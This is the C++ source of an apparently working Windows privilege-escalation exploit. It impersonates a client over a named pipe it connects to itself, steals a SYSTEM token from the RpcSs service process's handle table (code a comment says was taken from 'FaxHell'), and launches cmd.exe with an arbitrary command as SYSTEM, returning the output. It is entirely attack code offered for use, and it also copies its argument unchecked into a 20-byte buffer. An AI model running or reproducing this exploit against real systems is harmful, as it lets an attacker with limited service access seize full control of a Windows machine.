#include <Windows.h>
#include <stdio.h>
#include <sddl.h>
#include <Strsafe.h>
#include <iostream>
#include <tchar.h>
#include <ntstatus.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")
#define ProcessHandleInformation (PROCESSINFOCLASS)51
#define NtCurrentProcess() ((HANDLE)-1)
#define NtCurrentThread()  ((HANDLE)-2)

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO {
	HANDLE HandleValue;
	ULONGLONG HandleCount;
	ULONGLONG PointerCount;
	ACCESS_MASK GrantedAccess;
	ULONG ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO,
* PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION {
	ULONGLONG NumberOfHandles;
	ULONGLONG Reserved;
	PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION,
* PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

typedef struct _C_OBJECT_TYPE_INFORMATION {
	UNICODE_STRING TypeName;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccessMask;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	BOOLEAN TypeIndex;
	CHAR ReservedByte;
	ULONG PoolType;
	ULONG DefaultPagedPoolCharge;
	ULONG DefaultNonPagedPoolCharge;
} C_OBJECT_TYPE_INFORMATION,
* C_POBJECT_TYPE_INFORMATION;

static
HANDLE ServiceOpenControl(
	IN DWORD dwDesiredAccess
)
{
	/*++
	 *
	 * Function will open the local service control manager
	 * (SCM) using OpenSCManagerA() with the specified access
	 * and return a handle back to the user.
	 *
	 * Returns "NULL" if the function fails.
	 *
	--*/
	return OpenSCManagerA(NULL, NULL, dwDesiredAccess);
};

static
HANDLE ServiceOpen(
	IN SC_HANDLE ServiceMan,
	IN LPCSTR lpServiceName,
	IN DWORD dwDesiredAccess
)
{
	/*++
	 *
	 * Opens the service of the specified name, and
	 * returns a handle for usage by the client. The
	 * client is responsible for closing the service
	 * handle.
	 *
	--*/
	return OpenServiceA(ServiceMan,
		lpServiceName,
		dwDesiredAccess);
};

DWORD GetServiceProcessId(
	IN LPCWSTR lpServiceName
)
{
	DWORD                  dwProcessId = 0;
	DWORD                  dwReturnLen = 0;
	SC_HANDLE              hServiceMan = NULL;
	SC_HANDLE              hServicePtr = NULL;
	SERVICE_STATUS_PROCESS ProcessInfo = { 0 };

	/*++
	 *
	 * Connects to the local service control manager,
	 * and opens the service with the limited perm
	 * to query its current status.
	 *
	 * Once it has queries its status, it will try
	 * to read its process id value.
	 *
	--*/

	hServiceMan = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (hServiceMan != NULL) {
		hServicePtr = OpenService(hServiceMan, lpServiceName, SERVICE_QUERY_STATUS);
		if (hServicePtr != NULL) {
			QueryServiceStatusEx(hServicePtr,
				SC_STATUS_PROCESS_INFO,
				(LPBYTE)&ProcessInfo,
				sizeof(SERVICE_STATUS_PROCESS),
				&dwReturnLen);

			dwProcessId = ProcessInfo.dwProcessId;
		};
	};

	if (hServicePtr != NULL)
		CloseServiceHandle(hServicePtr);

	if (hServiceMan != NULL)
		CloseServiceHandle(hServiceMan);

	return dwProcessId;
};

static
ULONG
TokenObjectIndex(VOID)
{
	HANDLE   hToken = NULL;
	BOOL     Result = FALSE;
	ULONG    tIndex = 0;
	NTSTATUS Status;
	struct {
		C_OBJECT_TYPE_INFORMATION TypeInfo;
		WCHAR TypeNameBuffer[sizeof("Token")];
	} ObInfo;

	/*++
	 *
	 * Opens the current process token to acquire
	 * the object index, in an attempt to identify
	 * the id for any valid token handles found
	 * with NtQueryInformationProcess().
	 *
	--*/
	Result = OpenProcessToken(NtCurrentProcess(),
		MAXIMUM_ALLOWED,
		&hToken);

	if (Result != TRUE) {
		goto Failure;
	};

	Status = NtQueryObject(hToken,
		ObjectTypeInformation,
		&ObInfo,
		sizeof(ObInfo),
		NULL);

	if (!NT_SUCCESS(Status)) {
		goto Failure;
	};

	tIndex = ObInfo.TypeInfo.TypeIndex;

Failure:
	if (hToken != NULL) {
		CloseHandle(hToken);
	};

	return tIndex;
};

//
// Code Ripped From Alex Ionescu's FaxHell
//
HANDLE
TokenGetSystemTokenFromProcess(
	IN HANDLE hProcess
)
{
	ULONG                                oIndex = 0;
	ULONG                                InfLen = 0;
	ULONG                                RetLen = 0;
	HANDLE                               hToken = NULL;
	NTSTATUS                             Status;
	LUID                                 System = SYSTEM_LUID;
	BOOL                                 RetVal = FALSE;
	TOKEN_STATISTICS                     tStats = { 0 };
	PROCESS_HANDLE_SNAPSHOT_INFORMATION  lhInfo = { 0 };
	PPROCESS_HANDLE_SNAPSHOT_INFORMATION phInfo = &lhInfo;

	/*++
	 *
	 * Acquires the token object index to identify
	 * any open tokens within a process, and then
	 * tries to identify its type, and user. If the
	 * token is an impersonation and a SYSTEM token,
	 * it will return it back to the caller.
	 *
	--*/
	oIndex = TokenObjectIndex();
	if (oIndex != 0) {
		Status = NtQueryInformationProcess(hProcess,
			ProcessHandleInformation,
			phInfo,
			sizeof(*phInfo),
			&RetLen);

		if (NT_SUCCESS(Status)) {
			goto Failure;
		};

		RetLen += 16 * sizeof(*phInfo);
		phInfo = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)LocalAlloc(LPTR, RetLen);

		Status = NtQueryInformationProcess(hProcess,
			ProcessHandleInformation,
			phInfo,
			RetLen,
			NULL);

		if (!NT_SUCCESS(Status)) {
			goto Failure;
		};

		for (ULONG i = 0; i < phInfo->NumberOfHandles; ++i) {
			if ((phInfo->Handles[i].GrantedAccess == TOKEN_ALL_ACCESS) &&
				(phInfo->Handles[i].ObjectTypeIndex == oIndex))
			{
				RetVal = DuplicateHandle(hProcess,
					phInfo->Handles[i].HandleValue,
					NtCurrentProcess(),
					&hToken,
					0,
					FALSE,
					DUPLICATE_SAME_ACCESS);

				if (RetVal) {

					RetVal = GetTokenInformation(hToken,
						TokenStatistics,
						&tStats,
						sizeof(TOKEN_STATISTICS),
						&RetLen);

					if (RetVal) {
						if ((*(PULONGLONG)&tStats.AuthenticationId ==
							*(PULONGLONG)&System))
						{
							if (tStats.PrivilegeCount >= 22) {
								break;
							};
						};
					};
					CloseHandle(hToken);
					hToken = NULL;
				};
			};
		};
	};

Failure:
	if (phInfo != NULL && phInfo != &lhInfo)
		LocalFree(phInfo);

	return hToken;
};

int main(int argc, char** argv) {
	ULONG  ServicePID = 0;
	HANDLE ServicePtr = NULL;
	HANDLE ServiceTok, new_token, hReadPipe, hWritePipe = NULL;
	BOOL result, duplicated, bRes;
	STARTUPINFO StartupInfo = { 0 };
	PROCESS_INFORMATION procinfo = { 0 };
	SECURITY_ATTRIBUTES PipeAttributes = { 0 };


	char names[20] = "/c ";
	char* command = argv[1];
	strcat(names, command);
	WCHAR wszClassName[256];
	memset(wszClassName, 0, sizeof(wszClassName));
	MultiByteToWideChar(CP_ACP, 0, names, strlen(names) + 1, wszClassName, sizeof(wszClassName) / sizeof(wszClassName[0]));
	LPWSTR cmd = (LPWSTR)wszClassName;	//char* convert to lpwstr


	PipeAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);	//父进程创建子进程，必须让父进程的句柄可继承，可以用SECURITY_ATTRIBUTES来设置
	PipeAttributes.bInheritHandle = TRUE;
	PipeAttributes.lpSecurityDescriptor = FALSE;
	StartupInfo.cb = sizeof(STARTUPINFO);

	BOOL bRet = CreatePipe(&hReadPipe, &hWritePipe, &PipeAttributes, 0x400u);	//创建匿名管道

	StartupInfo.hStdError = hWritePipe;
	StartupInfo.hStdOutput = hWritePipe;
	StartupInfo.lpDesktop = L"WinSta0\\Default";
	StartupInfo.dwFlags = 257;
	StartupInfo.wShowWindow = 0;

	HANDLE serverPipe = CreateNamedPipe(L"\\\\.\\pipe\\pipey",  //创建一个命名管道
		PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
		PIPE_TYPE_BYTE |
		PIPE_READMODE_BYTE |
		PIPE_WAIT |
		PIPE_ACCEPT_REMOTE_CLIENTS,
		PIPE_UNLIMITED_INSTANCES,
		4096,
		4096,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);
	HANDLE hPipe2 = CreateFile(L"\\\\localhost\\pipe\\pipey",  //打开管道
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL);
	bRes = WriteFile(hPipe2, &serverPipe, sizeof(hPipe2), NULL, NULL);   //将Hipe写入管道
	bRes = ReadFile(serverPipe, &serverPipe, sizeof(serverPipe), NULL, NULL);


	std::wcout << "Impersonating the client..." << std::endl;
	if (ImpersonateNamedPipeClient(serverPipe)) {
		if ((ServicePID = GetServiceProcessId(L"RpcSs")) != 0)
		{
			printf("[+] Get rpcss PID %d\n", ServicePID);
			ServicePtr = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ServicePID);
			if (ServicePtr != NULL)
			{
				if (!(ServiceTok = TokenGetSystemTokenFromProcess(ServicePtr)))
				{
					std::wcout << "[-] TokenGetSystemTokenFromProcess error" << std::endl;
				}
			}
			else
			{
				printf("[-] OpenProcess rpcss error\n");
			}

		}
		else
		{
			printf("[-] Get rpcss error\n");
		}
	}
	else
	{
		printf("[-] ImpersonateNamedPipeClient error\n");
	}
	DisconnectNamedPipe(serverPipe);
	CloseHandle(serverPipe);
	
	result = DuplicateTokenEx(ServiceTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &new_token);
	if (result) {
		SetStdHandle(STD_OUTPUT_HANDLE, hWritePipe);// 设置标准输出到匿名管道
		printf("[+] Token Duplicated\n");
		duplicated = CreateProcessWithTokenW(new_token, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", cmd, CREATE_NO_WINDOW, NULL, NULL, &StartupInfo, &procinfo);
		if (duplicated) {
			//WaitForSingleObject(procinfo.hProcess, INFINITE);
			
			CloseHandle(procinfo.hThread);
			CloseHandle(procinfo.hProcess);
			CloseHandle(hWritePipe);
			printf("[+] SUCCESS\n");
			char szOutputBuffer[4096];
			DWORD dwBytesRead;
			while (TRUE) {
				memset(szOutputBuffer, 0x00, sizeof(szOutputBuffer));
				if (ReadFile(hReadPipe, szOutputBuffer, 4095, &dwBytesRead, NULL) == FALSE)
					break;
				printf("%s\n", szOutputBuffer);
			}
			CloseHandle(&StartupInfo);
			CloseHandle(&procinfo);
			exit(1);
		}
		else
		{
			printf("[!] FAIL\n");
		}
	
	}
	else
	{
		std::wcout << "DuplicateTokenEx ERROR" << std::endl;
	}
	

}